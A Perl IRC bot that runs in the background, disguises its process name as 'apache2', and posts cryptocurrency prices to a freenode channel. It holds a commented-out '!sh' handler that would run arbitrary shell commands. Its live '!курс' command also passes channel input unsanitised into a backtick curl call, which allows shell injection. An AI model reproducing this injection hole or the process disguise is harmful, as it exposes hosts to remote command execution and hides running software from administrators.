#!/usr/bin/perl
 
use warnings;
use strict;

use IO::Socket;
use threads;

my $f=fork();
exit(0) if $f;
die unless defined($f);

open (STDIN, "</dev/null");
open (STDOUT, ">/dev/null");
open (STDERR, ">&STDOUT");

my $proc = "apache2";
$0=$proc."\0"x16;
my $s = 'chat.freenode.net';
my $p = '6667';
my $z = 'tcp';
my $t = '30';
my $u = 'plbot';
my $c = '#s2ch';
my $n = 'coinBot';
my $e = "$u".`echo $$`;
my $m;
my @r = ();
my $g = 0;

my $k = IO::Socket::INET->new(PeerAddr=>$s,
	PeerPort=>$p,
	Proto=>$z,
	Timeout=>$t);

print $k "USER $u ".$k->sockhost." $s $e\r\n";
print $k "NICK $n\r\n";

while(my $a = <$k>) {
	#print $a;
	
	if($a =~ /^PING \:(.*)/) {
		print $k "PONG :$1\r\n";
		$g++;
		if($g == 1) { &q; }
		if($g == 31) { $g = 0; }
	}
	
	if($a =~ m/^\:(.+?)\s+001\s+(\S+)\s/i) {
		print $k "JOIN $c\r\n";
	}

#### DO NOT USE THIS FEATURE MOTHERFUCKER ####
#	if($a =~ /^\:(.+?)\!sh\s+(.*)/) {
#		my @o = `$2`;
#		chomp @o;
#		
#		foreach my $l (@o) {
#			print $k "PRIVMSG $c :$l\r\n";
#			sleep(1);
#		}
#	}
###############################################

	if ($a =~ /^\:(.+?)\!курс\s+(.*)/ ) {
		$m = $2;
		
		if($m) {
			@r = ();
			&j;
			print $k "PRIVMSG $c :@r\r\n";
		}
	}
	
	if ($a =~ /^\:(.+?)\!чо\s+(.*)/ ) {
		print $k "PRIVMSG $c :[ЧоЧо] Это использовать примерно так !курс eth-usd\r\n";
	}
	
	if ($a =~ /^\:(.+?)\!q\s+(.*)/ ) {
		####
	}
	
	sleep(0);
}

sub j {
	my $dmp = `curl -L -s https://api.cryptonator.com/api/ticker/$m`;
	$dmp =~ tr/"//d;
	my ($ticker, $target, $price, $volume, $change) = split(/,/, $dmp);
	my ($base1, $base2, $base3) = split(/{/, $ticker);
	my ($base3_1, $base3_2) = split(/:/,$base3);
	my ($target1, $target2) = split(/:/, $target);
	my ($price1, $price2) = split /:/, $price;
	my $rprice = sprintf("%.2f", $price2);
	my ($change1, $change2) = split(/:/, $change);
	my $rchange = sprintf("%.2f", $change2);
	push @r, "$base3_2/$target2: $rprice ($rchange) |";
	$ticker=0;$target=0;$price=0;$volume=0;$change=0;
	return @r;	
}

sub c {
	for(my $i=0;$i<4;$i++) {
		if($i == 0) {$m = "btc-usd";}
		if($i == 1) {$m = "btc-eur";}
		if($i == 2) {$m = "btc-cad";}
		if($i == 3) {$m = "btc-gbp";}
		&j;
	}
}

sub s {
	@r = ();
	&c;
	print $k "PRIVMSG $c :@r\r\n";
}

sub q {
	my $h = threads->new(\&s);
}
